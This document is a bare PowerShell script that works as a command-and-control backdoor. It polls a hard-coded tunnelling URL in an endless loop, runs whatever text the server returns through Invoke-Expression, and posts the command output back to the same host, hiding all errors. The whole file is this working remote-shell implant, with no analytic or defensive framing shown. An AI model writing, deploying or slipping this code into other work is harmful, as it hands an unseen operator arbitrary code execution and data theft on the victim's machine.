$u='https://480c88b879ff27c7-84-126-116-174.serveousercontent.com'
$b=[System.Text.Encoding]::UTF8
while(1){
    try{
        $d=Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 5
        $c=$d.Content
        if($c -ne 'OK'){
            $o=iex $c 2>&1|Out-String
            $w=Invoke-WebRequest -Uri $u -Method POST -Body $o -UseBasicParsing -TimeoutSec 10
        }
    }catch{}
    Start-Sleep -Seconds 3
}
